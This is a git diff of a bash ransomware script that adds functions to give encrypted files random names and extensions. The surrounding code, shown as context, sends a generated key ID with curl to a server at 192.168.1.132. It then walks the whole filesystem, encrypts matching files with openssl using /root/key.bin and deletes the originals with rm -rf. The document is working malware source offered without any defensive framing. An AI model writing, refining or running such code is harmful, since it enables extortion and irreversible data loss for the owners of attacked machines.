@@ -1,5 +1,75 @@
 #!/bin/bash
 
+genFileName() {
+  # Generate random value for the filename string size between 5 and 10
+  # Build a filename string with the length of this random size out of the character set 'a-z'
+  randString=$(cat /dev/urandom | tr -dc 'a-z' | fold -w $(shuf -i 5-10 -n 1) | head -n 1)
+
+  randStringSize=${#randString}
+
+  # Get a random number between the half of the string and the string size
+  randHalfString=$(($((randStringSize / 2)) + $((RANDOM % randStringSize))))
+
+  # Get a random number between 1 and this random number from Step 6
+  # (This number is used as value for how many random numbers are inserted into the string in the next step)
+  randNum=$((1 + (RANDOM % randHalfString)))
+
+  # Do step 8 as many times as the random value in step 7 says
+  for ((i=0; i<${randNum}; i++))
+  do
+    # Generate a random ASCII number (char) between 0-9 and insert it at a random position in the string
+    getRandNum=$((RANDOM % 9))
+    getRandPos=$((RANDOM % randStringSize))
+
+    if [ ${getRandPos} == 0 ]
+    then
+      let getRandPos=$((getRandPos + 1))
+    fi
+
+    getNewString=$(echo "${randString}" | sed "s/^\(.\{$getRandPos\}\)/\1$getRandNum/")
+
+    randString="${getNewString}"
+    randStringSize="${#randString}"
+  done
+
+  echo "${randString}"
+}
+
+genExtName() {
+  # Generate random value for the filename string size between 5 and 10
+  # Build a filename string with the length of this random size out of the character set 'a-z'
+  randString=$(cat /dev/urandom | tr -dc 'a-z' | fold -w $(shuf -i 2-5 -n 1) | head -n 1)
+
+  randStringSize=${#randString}
+
+  # Get a random number between the half of the string and the string size
+  randHalfString=$(($((randStringSize / 2)) + $((RANDOM % randStringSize))))
+
+  # Get a random number between 1 and this random number from Step 6
+  # (This number is used as value for how many random numbers are inserted into the string in the next step)
+  randNum=$((1 + (RANDOM % randHalfString)))
+
+  # Do step 8 as many times as the random value in step 7 says
+  for ((i=0; i<${randNum}; i++))
+  do
+    # Generate a random ASCII number (char) between 0-9 and insert it at a random position in the string
+    getRandNum=$((RANDOM % 9))
+    getRandPos=$((RANDOM % randStringSize))
+
+    if [ ${getRandPos} == 0 ]
+    then
+      let getRandPos=$((getRandPos + 1))
+    fi
+
+    getNewString=$(echo "${randString}" | sed "s/^\(.\{$getRandPos\}\)/\1$getRandNum/")
+
+    randString="${getNewString}"
+    randStringSize="${#randString}"
+  done
+
+  echo "${randString}"
+}
+
 genKey=$(cat /dev/urandom | tr -dc 'A-Z0-9a-z' | fold -w 16 | head -n 1)
 
 curl -k -d "uniqueID=${genKey}" https://192.168.1.132/target.php &>/dev/null
@@ -72,7 +142,10 @@ for ((num=0; num<"${#fileExts[@]}"; num++))
 do
   for file in $(find / -name "${fileExts[${num}]}")
   do
-    openssl enc -aes-256-cbc -salt -in "${file}" -out "${file}.owned" -pass file:/root/key.bin &>/dev/null
+    setFileName=$(genFileName)
+    setExtName=$(genExtName)
+
+    openssl enc -aes-256-cbc -salt -in "${file}" -out "${setFileName}.${setExtName}" -pass file:/root/key.bin &>/dev/null
 
     rm -rf  ${file} &>/dev/null
 
@@ -84,7 +157,10 @@ for ((num=0; num<"${#fileList[@]}"; num++))
 do
   for file in "${fileList[${num}]}"
   do
-    openssl enc -aes-256-cbc -salt -in "${file}" -out "${file}.owned" -pass file:/root/key.bin &>/dev/null
+    setFileName=$(genFileName)
+    setExtName=$(genExtName)
+
+    openssl enc -aes-256-cbc -salt -in "${file}" -out "${setFileName}.${setExtName}" -pass file:/root/key.bin &>/dev/null
 
     rm -rf ${file} &>/dev/null
 
